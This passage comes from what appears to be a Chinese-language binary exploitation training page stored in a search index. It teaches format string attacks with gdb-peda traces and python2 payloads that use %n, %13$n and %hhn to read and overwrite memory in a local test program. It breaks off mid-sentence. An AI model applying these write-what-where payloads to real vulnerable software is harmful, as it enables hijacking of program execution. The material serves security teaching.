&lt;printf+10&gt;:      sub    esp,0xc\n   0xf7e27c2d &lt;printf+13&gt;:      mov    eax,DWORD PTR [eax+0x124]\n   0xf7e27c33 &lt;printf+19&gt;:      lea    edx,[esp+0x14]\nNo argument\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd54c --&gt; 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)\n0004| 0xffffd550 --&gt; 0xffffd584 --&gt; 0x804a018 --&gt; 0xf7e3a790 (&lt;__isoc99_scanf&gt;: push   ebp)\n0008| 0xffffd554 --&gt; 0x1\n0012| 0xffffd558 --&gt; 0x88888888\n0016| 0xffffd55c --&gt; 0xffffffff\n0020| 0xffffd560 --&gt; 0xffffd57a (\"ABCD\")\n0024| 0xffffd564 --&gt; 0xffffd584 --&gt; 0x804a018 --&gt; 0xf7e3a790 (&lt;__isoc99_scanf&gt;: push   ebp)\n0028| 0xffffd568 --&gt; 0x80481fc --&gt; 0x38 ('8')\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6\ngdb-peda$ x/20w $esp\n0xffffd54c:     0x08048520      0xffffd584      0x00000001      0x88888888\n0xffffd55c:     0xffffffff      0xffffd57a      0xffffd584      0x080481fc\n0xffffd56c:     0x080484b0      0xf7ffda54      0x00000001      0x424135d0\n0xffffd57c:     0x00004443      0x00000000      0x0804a018      0x24333125\n0xffffd58c:     0x00f00073      0xffffd5ca      0x00000001      0x000000c2\ngdb-peda$ x/w 0x804a018\n0x804a018:      0xf7e3a790\ngdb-peda$ c\nContinuing.\n\u2592\ufffd\ufffd\ufffd\ufffd\n</code></pre> <p>\u867d\u7136\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 <code>x/w</code> \u6307\u4ee4\u5f97\u5230 <code>__isoc99_scanf</code> \u51fd\u6570\u7684\u865a\u62df\u5730\u5740 <code>0xf7e3a790</code>\u3002\u4f46\u662f\u7531\u4e8e <code>0x804a018</code> \u5904\u7684\u5185\u5bb9\u662f\u4ecd\u7136\u4e00\u4e2a\u6307\u9488\uff0c\u4f7f\u7528 <code>%13$s</code> \u6253\u5370\u5e76\u4e0d\u6210\u529f\u3002\u5728\u4e0b\u9762\u7684\u5185\u5bb9\u4e2d\u5c06\u4f1a\u4ecb\u7ecd\u600e\u6837\u501f\u52a9 pwntools \u7684\u529b\u91cf\uff0c\u6765\u83b7\u5f97\u6b63\u786e\u683c\u5f0f\u7684\u865a\u62df\u5730\u5740\uff0c\u5e76\u80fd\u591f\u5bf9\u5b83\u6709\u8fdb\u4e00\u6b65\u7684\u5229\u7528\u3002</p> <p>\u5f53\u7136\u5e76\u975e\u603b\u80fd\u901a\u8fc7\u4f7f\u7528 4 \u5b57\u8282\u7684\u8df3\u8f6c\uff08\u5982 <code>AAAA</code>\uff09\u6765\u6b65\u8fdb\u53c2\u6570\u6307\u9488\u53bb\u5f15\u7528\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u90e8\u5206\uff0c\u6709\u65f6\uff0c\u9700\u8981\u5728\u683c\u5f0f\u5b57\u7b26\u4e32\u4e4b\u524d\u52a0\u4e00\u4e2a\u3001\u4e24\u4e2a\u6216\u4e09\u4e2a\u5b57\u7b26\u7684\u524d\u7f00\u6765\u5b9e\u73b0\u4e00\u7cfb\u5217\u7684 \uff14 \u5b57\u8282\u8df3\u8f6c\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#_11","title":"\u8986\u76d6\u6808\u5185\u5bb9","text":"<p>\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u53ef\u4ee5\u8bfb\u53d6\u6808\u4e0a\u548c\u4efb\u610f\u5730\u5740\u7684\u5185\u5b58\u4e86\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u66f4\u8fdb\u4e00\u6b65\uff0c\u901a\u8fc7\u4fee\u6539\u6808\u548c\u5185\u5b58\u6765\u52ab\u6301\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002<code>%n</code> \u8f6c\u6362\u6307\u793a\u7b26\u5c06 <code>%n</code> \u5f53\u524d\u5df2\u7ecf\u6210\u529f\u5199\u5165\u6d41\u6216\u7f13\u51b2\u533a\u4e2d\u7684\u5b57\u7b26\u4e2a\u6570\u5b58\u50a8\u5230\u5730\u5740\u7531\u53c2\u6570\u6307\u5b9a\u7684\u6574\u6570\u4e2d\u3002</p> <pre><code>#include&lt;stdio.h&gt;\nvoid main() {\n    int i;\n    char str[] = \"hello\";\n\n    printf(\"%s %n\\n\", str, &amp;i);\n    printf(\"%d\\n\", i);\n}\n$ ./a.out\nhello\n6\n</code></pre> <p><code>i</code> \u88ab\u8d4b\u503c\u4e3a 6\uff0c\u56e0\u4e3a\u5728\u9047\u5230\u8f6c\u6362\u6307\u793a\u7b26\u4e4b\u524d\u4e00\u5171\u5199\u5165\u4e86 6 \u4e2a\u5b57\u7b26\uff08<code>hello</code> \u52a0\u4e0a\u4e00\u4e2a\u7a7a\u683c\uff09\u3002\u5728\u6ca1\u6709\u957f\u5ea6\u4fee\u9970\u7b26\u65f6\uff0c\u9ed8\u8ba4\u5199\u5165\u4e00\u4e2a <code>int</code> \u7c7b\u578b\u7684\u503c\u3002</p> <p>\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u8981\u9700\u8981\u8986\u5199\u7684\u503c\u662f\u4e00\u4e2a shellcode \u7684\u5730\u5740\uff0c\u800c\u8fd9\u4e2a\u5730\u5740\u5f80\u5f80\u662f\u4e00\u4e2a\u5f88\u5927\u7684\u6570\u5b57\u3002\u8fd9\u65f6\u6211\u4eec\u5c31\u9700\u8981\u901a\u8fc7\u4f7f\u7528\u5177\u4f53\u7684\u5bbd\u5ea6\u6216\u7cbe\u5ea6\u7684\u8f6c\u6362\u89c4\u8303\u6765\u63a7\u5236\u5199\u5165\u7684\u5b57\u7b26\u4e2a\u6570\uff0c\u5373\u5728\u683c\u5f0f\u5b57\u7b26\u4e32\u4e2d\u52a0\u4e0a\u4e00\u4e2a\u5341\u8fdb\u5236\u6574\u6570\u6765\u8868\u793a\u8f93\u51fa\u7684\u6700\u5c0f\u4f4d\u6570\uff0c\u5982\u679c\u5b9e\u9645\u4f4d\u6570\u5927\u4e8e\u5b9a\u4e49\u7684\u5bbd\u5ea6\uff0c\u5219\u6309\u5b9e\u9645\u4f4d\u6570\u8f93\u51fa\uff0c\u53cd\u4e4b\u5219\u4ee5\u7a7a\u683c\u6216 0 \u8865\u9f50\uff08<code>0</code> \u8865\u9f50\u65f6\u5728\u5bbd\u5ea6\u524d\u52a0\u70b9<code>.</code> \u6216 <code>0</code>\uff09\u3002\u5982\uff1a</p> <pre><code>#include&lt;stdio.h&gt;\nvoid main() {\n    int i;\n\n    printf(\"%10u%n\\n\", 1, &amp;i);\n    printf(\"%d\\n\", i);\n    printf(\"%.50u%n\\n\", 1, &amp;i);\n    printf(\"%d\\n\", i);\n    printf(\"%0100u%n\\n\", 1, &amp;i);\n    printf(\"%d\\n\", i);\n}\n$ ./a.out\n         1\n10\n00000000000000000000000000000000000000000000000001\n50\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001\n100\n</code></pre> <p>\u5c31\u662f\u8fd9\u6837\uff0c\u4e0b\u9762\u6211\u4eec\u628a\u5730\u5740 <code>0x8048000</code> \u5199\u5165\u5185\u5b58\uff1a</p> <pre><code>printf(\"%0134512640d%n\\n\", 1, &amp;i);\n$ ./a.out\n...\n0x8048000\n</code></pre> <p>\u8fd8\u662f\u6211\u4eec\u4e00\u5f00\u59cb\u7684\u7a0b\u5e8f\uff0c\u6211\u4eec\u5c1d\u8bd5\u5c06 <code>arg2</code> \u7684\u503c\u66f4\u6539\u4e3a\u4efb\u610f\u503c\uff08\u6bd4\u5982 <code>0x00000020</code>\uff0c\u5341\u8fdb\u5236 32\uff09\uff0c\u5728 gdb \u4e2d\u53ef\u4ee5\u770b\u5230\u5f97\u5230 <code>arg2</code> \u7684\u5730\u5740 <code>0xffffd538</code>\uff0c\u90a3\u4e48\u6211\u4eec\u6784\u9020\u683c\u5f0f\u5b57\u7b26\u4e32 <code>\\x38\\xd5\\xff\\xff%08x%08x%012d%13$n</code>\uff0c\u5176\u4e2d <code>\\x38\\xd5\\xff\\xff</code> \u8868\u793a <code>arg2</code> \u7684\u5730\u5740\uff0c\u5360 4 \u5b57\u8282\uff0c<code>%08x%08x</code> \u8868\u793a\u4e24\u4e2a 8 \u5b57\u7b26\u5bbd\u7684\u5341\u516d\u8fdb\u5236\u6570\uff0c\u5360 16 \u5b57\u8282\uff0c<code>%012d</code> \u5360 12 \u5b57\u8282\uff0c\u4e09\u4e2a\u90e8\u5206\u52a0\u8d77\u6765\u5c31\u5360\u4e86 4+16+12=32 \u5b57\u8282\uff0c\u5373\u628a <code>arg2</code> \u8d4b\u503c\u4e3a <code>0x00000020</code>\u3002\u683c\u5f0f\u5b57\u7b26\u4e32\u6700\u540e\u4e00\u90e8\u5206 <code>%13$n</code> \u4e5f\u662f\u6700\u91cd\u8981\u7684\u4e00\u90e8\u5206\uff0c\u548c\u4e0a\u9762\u7684\u5185\u5bb9\u4e00\u6837\uff0c\u8868\u793a\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u7b2c 13 \u4e2a\u53c2\u6570\uff0c\u5373\u5199\u5165 <code>0xffffd538</code> \u7684\u5730\u65b9\uff08<code>0xffffd564</code>\uff09\uff0c<code>printf()</code> \u5c31\u662f\u901a\u8fc7\u8fd9\u4e2a\u5730\u5740\u627e\u5230\u88ab\u8986\u76d6\u7684\u5185\u5bb9\u7684\uff1a</p> <pre><code>$ python2 -c 'print(\"\\x38\\xd5\\xff\\xff%08x%08x%012d%13$n\")' &gt; text\n$ gdb -q a.out\nReading symbols from a.out...(no debugging symbols found)...done.\ngdb-peda$ b printf  \nBreakpoint 1 at 0x8048350\ngdb-peda$ r &lt; text  \n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd564 --&gt; 0xffffd538 --&gt; 0x88888888\nEBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1\nECX: 0x1\nEDX: 0xf7f9883c --&gt; 0x0\nESI: 0xf7f96e68 --&gt; 0x1bad90\nEDI: 0x0\nEBP: 0xffffd5f8 --&gt; 0x0\nESP: 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:      add    esp,0x20)\nEIP: 0xf7e27c20 (&lt;printf&gt;:      call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;)\nEFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0xf7e27c1b &lt;fprintf+27&gt;:     ret\n   0xf7e27c1c:  xchg   ax,ax\n   0xf7e27c1e:  xchg   ax,ax\n=&gt; 0xf7e27c20 &lt;printf&gt;: call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;\n   0xf7e27c25 &lt;printf+5&gt;:       add    eax,0x16f243\n   0xf7e27c2a &lt;printf+10&gt;:      sub    esp,0xc\n   0xf7e27c2d &lt;printf+13&gt;:      mov    eax,DWORD PTR [eax+0x124]\n   0xf7e27c33 &lt;printf+19&gt;:      lea    edx,[esp+0x14]\nNo argument\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)\n0004| 0xffffd530 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x88888888\n0008| 0xffffd534 --&gt; 0x1\n0012| 0xffffd538 --&gt; 0x88888888\n0016| 0xffffd53c --&gt; 0xffffffff\n0020| 0xffffd540 --&gt; 0xffffd55a (\"ABCD\")\n0024| 0xffffd544 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x88888888\n0028| 0xffffd548 --&gt; 0x80481fc --&gt; 0x38 ('8')\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6\ngdb-peda$ x/20x $esp\n0xffffd52c:     0x08048520      0xffffd564      0x00000001      0x88888888\n0xffffd53c:     0xffffffff      0xffffd55a      0xffffd564      0x080481fc\n0xffffd54c:     0x080484b0      0xf7ffda54      0x00000001      0x424135d0\n0xffffd55c:     0x00004443      0x00000000      0xffffd538      0x78383025\n0xffffd56c:     0x78383025      0x32313025      0x33312564      0x00006e24\ngdb-peda$ finish\nRun till exit from #0  0xf7e27c20 in printf () from /usr/lib32/libc.so.6\n[----------------------------------registers-----------------------------------]\nEAX: 0x20 (' ')\nEBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1\nECX: 0x0\nEDX: 0xf7f98830 --&gt; 0x0\nESI: 0xf7f96e68 --&gt; 0x1bad90\nEDI: 0x0\nEBP: 0xffffd5f8 --&gt; 0x0\nESP: 0xffffd530 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x20 (' ')\nEIP: 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)\nEFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x8048514 &lt;main+126&gt;:        lea    eax,[ebp-0x94]\n   0x804851a &lt;main+132&gt;:        push   eax\n   0x804851b &lt;main+133&gt;:        call   0x8048350 &lt;printf@plt&gt;\n=&gt; 0x8048520 &lt;main+138&gt;:        add    esp,0x20\n   0x8048523 &lt;main+141&gt;:        sub    esp,0xc\n   0x8048526 &lt;main+144&gt;:        push   0xa\n   0x8048528 &lt;main+146&gt;:        call   0x8048370 &lt;putchar@plt&gt;\n   0x804852d &lt;main+151&gt;:        add    esp,0x10\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd530 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x20 (' ')\n0004| 0xffffd534 --&gt; 0x1\n0008| 0xffffd538 --&gt; 0x20 (' ')\n0012| 0xffffd53c --&gt; 0xffffffff\n0016| 0xffffd540 --&gt; 0xffffd55a (\"ABCD\")\n0020| 0xffffd544 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x20 (' ')\n0024| 0xffffd548 --&gt; 0x80481fc --&gt; 0x38 ('8')\n0028| 0xffffd54c --&gt; 0x80484b0 (&lt;main+26&gt;:      add    ebx,0x1b50)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x08048520 in main ()\ngdb-peda$ x/20x $esp\n0xffffd530:     0xffffd564      0x00000001      0x00000020      0xffffffff\n0xffffd540:     0xffffd55a      0xffffd564      0x080481fc      0x080484b0\n0xffffd550:     0xf7ffda54      0x00000001      0x424135d0      0x00004443\n0xffffd560:     0x00000000      0xffffd538      0x78383025      0x78383025\n0xffffd570:     0x32313025      0x33312564      0x00006e24      0xf7e70240\n</code></pre> <p>\u5bf9\u6bd4 <code>printf()</code> \u51fd\u6570\u6267\u884c\u524d\u540e\u7684\u8f93\u51fa\uff0c<code>printf</code> \u9996\u5148\u89e3\u6790 <code>%13$n</code> \u627e\u5230\u83b7\u5f97\u5730\u5740 <code>0xffffd564</code> \u7684\u503c <code>0xffffd538</code>\uff0c\u7136\u540e\u8df3\u8f6c\u5230\u5730\u5740 <code>0xffffd538</code>\uff0c\u5c06\u5b83\u7684\u503c <code>0x88888888</code> \u8986\u76d6\u4e3a <code>0x00000020</code>\uff0c\u5c31\u5f97\u5230 <code>arg2=0x00000020</code>\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#_12","title":"\u8986\u76d6\u4efb\u610f\u5730\u5740\u5185\u5b58","text":"<p>\u4e5f\u8bb8\u5df2\u7ecf\u6709\u4eba\u53d1\u73b0\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u4f7f\u7528\u4e0a\u9762\u8986\u76d6\u5185\u5b58\u7684\u65b9\u6cd5\uff0c\u503c\u6700\u5c0f\u53ea\u80fd\u662f 4\uff0c\u56e0\u4e3a\u5355\u5355\u5730\u5740\u5c31\u5360\u53bb\u4e86 4 \u4e2a\u5b57\u8282\u3002\u90a3\u4e48\u6211\u4eec\u600e\u6837\u8986\u76d6\u6bd4 4 \u5c0f\u7684\u503c\u5462\u3002\u5229\u7528\u6574\u6570\u6ea2\u51fa\u662f\u4e00\u4e2a\u65b9\u6cd5\uff0c\u4f46\u662f\u5728\u5b9e\u8df5\u4e2d\u8fd9\u6837\u505a\u57fa\u672c\u90fd\u4e0d\u4f1a\u6210\u529f\u3002\u518d\u60f3\u4e00\u4e0b\uff0c\u524d\u9762\u7684\u8f93\u5165\u4e2d\uff0c\u5730\u5740\u90fd\u4f4d\u4e8e\u683c\u5f0f\u5b57\u7b26\u4e32\u4e4b\u524d\uff0c\u8fd9\u6837\u505a\u771f\u7684\u6709\u5fc5\u8981\u5417\uff0c\u80fd\u5426\u5c06\u5730\u5740\u653e\u5728\u4e2d\u95f4\u3002\u6211\u4eec\u6765\u8bd5\u4e00\u4e0b\uff0c\u4f7f\u7528\u683c\u5f0f\u5b57\u7b26\u4e32 <code>\"AA%15$nA\"+\"\\x38\\xd5\\xff\\xff\"</code>\uff0c\u5f00\u5934\u7684 <code>AA</code> \u5360\u4e24\u4e2a\u5b57\u8282\uff0c\u5373\u5c06\u5730\u5740\u8d4b\u503c\u4e3a <code>2</code>\uff0c\u4e2d\u95f4\u662f <code>%15$n</code> \u5360 5 \u4e2a\u5b57\u8282\uff0c\u8fd9\u91cc\u4e0d\u662f <code>%13$n</code>\uff0c\u56e0\u4e3a\u5730\u5740\u88ab\u6211\u4eec\u653e\u5728\u4e86\u540e\u9762\uff0c\u5728\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u7b2c 15 \u4e2a\u53c2\u6570\uff0c\u540e\u9762\u8ddf\u4e0a\u4e00\u4e2a <code>A</code> \u5360\u7528\u4e00\u4e2a\u5b57\u8282\u3002\u4e8e\u662f\u524d\u534a\u90e8\u5206\u603b\u5171\u5360\u7528\u4e86 2+5+1=8 \u4e2a\u5b57\u8282\uff0c\u521a\u597d\u662f\u4e24\u4e2a\u53c2\u6570\u7684\u5bbd\u5ea6\uff0c\u8fd9\u91cc\u7684 8 \u5b57\u8282\u5bf9\u9f50\u5341\u5206\u91cd\u8981\u3002\u6700\u540e\u518d\u8f93\u5165\u6211\u4eec\u8981\u8986\u76d6\u7684\u5730\u5740 <code>\\x38\\xd5\\xff\\xff</code>\uff0c\u8be6\u7ec6\u8f93\u51fa\u5982\u4e0b\uff1a</p> <pre><code>$ python2 -c 'print(\"AA%15$nA\"+\"\\x38\\xd5\\xff\\xff\")' &gt; text\n$ gdb -q a.out\nReading symbols from a.out...(no debugging symbols found)...done.\ngdb-peda$ b printf  \nBreakpoint 1 at 0x8048350\ngdb-peda$ r &lt; text  \n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd564 (\"AA%15$nA8\\325\\377\\377\")\nEBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1\nECX: 0x1\nEDX: 0xf7f9883c --&gt; 0x0\nESI: 0xf7f96e68 --&gt; 0x1bad90\nEDI: 0x0\nEBP: 0xffffd5f8 --&gt; 0x0\nESP: 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:      add    esp,0x20)\nEIP: 0xf7e27c20 (&lt;printf&gt;:      call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;)\nEFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0xf7e27c1b &lt;fprintf+27&gt;:     ret\n   0xf7e27c1c:  xchg   ax,ax\n   0xf7e27c1e:  xchg   ax,ax\n=&gt; 0xf7e27c20 &lt;printf&gt;: call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;\n   0xf7e27c25 &lt;printf+5&gt;:       add    eax,0x16f243\n   0xf7e27c2a &lt;printf+10&gt;:      sub    esp,0xc\n   0xf7e27c2d &lt;printf+13&gt;:      mov    eax,DWORD PTR [eax+0x124]\n   0xf7e27c33 &lt;printf+19&gt;:      lea    edx,[esp+0x14]\nNo argument\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)\n0004| 0xffffd530 --&gt; 0xffffd564 (\"AA%15$nA8\\325\\377\\377\")\n0008| 0xffffd534 --&gt; 0x1\n0012| 0xffffd538 --&gt; 0x88888888\n0016| 0xffffd53c --&gt; 0xffffffff\n0020| 0xffffd540 --&gt; 0xffffd55a (\"ABCD\")\n0024| 0xffffd544 --&gt; 0xffffd564 (\"AA%15$nA8\\325\\377\\377\")\n0028| 0xffffd548 --&gt; 0x80481fc --&gt; 0x38 ('8')\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6\ngdb-peda$ x/20x $esp\n0xffffd52c:     0x08048520      0xffffd564      0x00000001      0x88888888\n0xffffd53c:     0xffffffff      0xffffd55a      0xffffd564      0x080481fc\n0xffffd54c:     0x080484b0      0xf7ffda54      0x00000001      0x424135d0\n0xffffd55c:     0x00004443      0x00000000      0x31254141      0x416e2435\n0xffffd56c:     0xffffd538      0xffffd500      0x00000001      0x000000c2\ngdb-peda$ finish\nRun till exit from #0  0xf7e27c20 in printf () from /usr/lib32/libc.so.6\n[----------------------------------registers-----------------------------------]\nEAX: 0x7\nEBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1\nECX: 0x0\nEDX: 0xf7f98830 --&gt; 0x0\nESI: 0xf7f96e68 --&gt; 0x1bad90\nEDI: 0x0\nEBP: 0xffffd5f8 --&gt; 0x0\nESP: 0xffffd530 --&gt; 0xffffd564 (\"AA%15$nA8\\325\\377\\377\")\nEIP: 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)\nEFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x8048514 &lt;main+126&gt;:        lea    eax,[ebp-0x94]\n   0x804851a &lt;main+132&gt;:        push   eax\n   0x804851b &lt;main+133&gt;:        call   0x8048350 &lt;printf@plt&gt;\n=&gt; 0x8048520 &lt;main+138&gt;:        add    esp,0x20\n   0x8048523 &lt;main+141&gt;:        sub    esp,0xc\n   0x8048526 &lt;main+144&gt;:        push   0xa\n   0x8048528 &lt;main+146&gt;:        call   0x8048370 &lt;putchar@plt&gt;\n   0x804852d &lt;main+151&gt;:        add    esp,0x10\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd530 --&gt; 0xffffd564 (\"AA%15$nA8\\325\\377\\377\")\n0004| 0xffffd534 --&gt; 0x1\n0008| 0xffffd538 --&gt; 0x2\n0012| 0xffffd53c --&gt; 0xffffffff\n0016| 0xffffd540 --&gt; 0xffffd55a (\"ABCD\")\n0020| 0xffffd544 --&gt; 0xffffd564 (\"AA%15$nA8\\325\\377\\377\")\n0024| 0xffffd548 --&gt; 0x80481fc --&gt; 0x38 ('8')\n0028| 0xffffd54c --&gt; 0x80484b0 (&lt;main+26&gt;:      add    ebx,0x1b50)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x08048520 in main ()\ngdb-peda$ x/20x $esp\n0xffffd530:     0xffffd564      0x00000001      0x00000002      0xffffffff\n0xffffd540:     0xffffd55a      0xffffd564      0x080481fc      0x080484b0\n0xffffd550:     0xf7ffda54      0x00000001      0x424135d0      0x00004443\n0xffffd560:     0x00000000      0x31254141      0x416e2435      0xffffd538\n0xffffd570:     0xffffd500      0x00000001      0x000000c2      0xf7e70240\n</code></pre> <p>\u5bf9\u6bd4 <code>printf()</code> \u51fd\u6570\u6267\u884c\u524d\u540e\u7684\u8f93\u51fa\uff0c\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u6210\u529f\u5730\u7ed9 <code>arg2</code> \u8d4b\u503c\u4e86 <code>0x00000002</code>\u3002</p> <p>\u8bf4\u5b8c\u4e86\u6570\u5b57\u5c0f\u4e8e 4 \u65f6\u7684\u8986\u76d6\uff0c\u63a5\u4e0b\u6765\u8bf4\u8bf4\u5927\u6570\u5b57\u7684\u8986\u76d6\u3002\u524d\u9762\u7684\u65b9\u6cd5\u6559\u6211\u4eec\u76f4\u63a5\u8f93\u5165\u4e00\u4e2a\u5730\u5740\u7684\u5341\u8fdb\u5236\u5c31\u53ef\u4ee5\u8fdb\u884c\u8d4b\u503c\uff0c\u53ef\u662f\uff0c\u8fd9\u6837\u5360\u7528\u7684\u5185\u5b58\u7a7a\u95f4\u592a\u5927\uff0c\u5f80\u5f80\u4f1a\u8986\u76d6\u6389\u5176\u4ed6\u91cd\u8981\u7684\u5730\u5740\u800c\u4ea7\u751f\u9519\u8bef\u3002\u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u957f\u5ea6\u4fee\u9970\u7b26\u6765\u66f4\u6539\u5199\u5165\u7684\u503c\u7684\u5927\u5c0f\uff1a</p> <pre><code>char c;\nshort s;\nint i;\nlong l;\nlong long ll;\n\nprintf(\"%s %hhn\\n\", str, &amp;c);       // \u5199\u5165\u5355\u5b57\u8282\nprintf(\"%s %hn\\n\", str, &amp;s);        // \u5199\u5165\u53cc\u5b57\u8282\nprintf(\"%s %n\\n\", str, &amp;i);         // \u5199\u51654\u5b57\u8282\nprintf(\"%s %ln\\n\", str, &amp;l);        // \u5199\u51658\u5b57\u8282\nprintf(\"%s %lln\\n\", str, &amp;ll);      // \u5199\u516516\u5b57\u8282\n</code></pre> <p>\u8bd5\u4e00\u4e0b\uff1a</p> <pre><code>$ python2 -c 'print(\"A%15$hhn\"+\"\\x38\\xd5\\xff\\xff\")' &gt; text\n0xffffd530:     0xffffd564      0x00000001      0x88888801      0xffffffff\n\n$ python2 -c 'print(\"A%15$hnA\"+\"\\x38\\xd5\\xff\\xff\")' &gt; text\n0xffffd530:     0xffffd564      0x00000001      0x88880001      0xffffffff\n\n$ python2 -c 'print(\"A%15$nAA\"+\"\\x38\\xd5\\xff\\xff\")' &gt; text\n0xffffd530:     0xffffd564      0x00000001      0x00000001      0xffffffff\n</code></pre> <p>\u4e8e\u662f\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u9010\u5b57\u8282\u5730\u8986\u76d6\uff0c\u4ece\u800c\u5927\u5927\u8282\u7701\u4e86\u5185\u5b58\u7a7a\u95f4\u3002\u8fd9\u91cc\u6211\u4eec\u5c1d\u8bd5\u5199\u5165 <code>0x12345678</code> \u5230\u5730\u5740 <code>0xffffd538</code>\uff0c\u9996\u5148\u4f7f\u7528 <code>AAAABBBBCCCCDDDD</code> \u4f5c\u4e3a\u8f93\u5165\uff1a</p> <pre><code>gdb-peda$ r\nAAAABBBBCCCCDDDD\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd564 (\"AAAABBBBCCCCDDDD\")\nEBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1\nECX: 0x1\nEDX: 0xf7f9883c --&gt; 0x0\nESI: 0xf7f96e68 --&gt; 0x1bad90\nEDI: 0x0\nEBP: 0xffffd5f8 --&gt; 0x0\nESP: 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:      add    esp,0x20)\nEIP: 0xf7e27c20 (&lt;printf&gt;:      call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;)\nEFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0xf7e27c1b &lt;fprintf+27&gt;:     ret\n   0xf7e27c1c:  xchg   ax,ax\n   0xf7e27c1e:  xchg   ax,ax\n=&gt; 0xf7e27c20 &lt;printf&gt;: call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;\n   0xf7e27c25 &lt;printf+5&gt;:       add    eax,0x16f243\n   0xf7e27c2a &lt;printf+10&gt;:      sub    esp,0xc\n   0xf7e27c2d &lt;printf+13&gt;:      mov    eax,DWORD PTR [eax+0x124]\n   0xf7e27c33 &lt;printf+19&gt;:      lea    edx,[esp+0x14]\nNo argument\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)\n0004| 0xffffd530 --&gt; 0xffffd564 (\"AAAABBBBCCCCDDDD\")\n0008| 0xffffd534 --&gt; 0x1\n0012| 0xffffd538 --&gt; 0x88888888\n0016| 0xffffd53c --&gt; 0xffffffff\n0020| 0xffffd540 --&gt; 0xffffd55a (\"ABCD\")\n0024| 0xffffd544 --&gt; 0xffffd564 (\"AAAABBBBCCCCDDDD\")\n0028| 0xffffd548 --&gt; 0x80481fc --&gt; 0x38 ('8')\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6\ngdb-peda$ x/20x $esp\n0xffffd52c:     0x08048520      0xffffd564      0x00000001      0x88888888\n0xffffd53c:     0xffffffff      0xffffd55a      0xffffd564      0x080481fc\n0xffffd54c:     0x080484b0      0xf7ffda54      0x00000001      0x424135d0\n0xffffd55c:     0x00004443      0x00000000      0x41414141      0x42424242\n0xffffd56c:     0x43434343      0x44444444      0x00000000      0x000000c2\ngdb-peda$ x/4wb 0xffffd538\n0xffffd538:     0x88    0x88    0x88    0x88\n</code></pre> <p>\u7531\u4e8e\u6211\u4eec\u60f3\u8981\u9010\u5b57\u8282\u8986\u76d6\uff0c\u5c31\u9700\u8981 4 \u4e2a\u7528\u4e8e\u8df3\u8f6c\u7684\u5730\u5740\uff0c4 \u4e2a\u5199\u5165\u5730\u5740\u548c 4 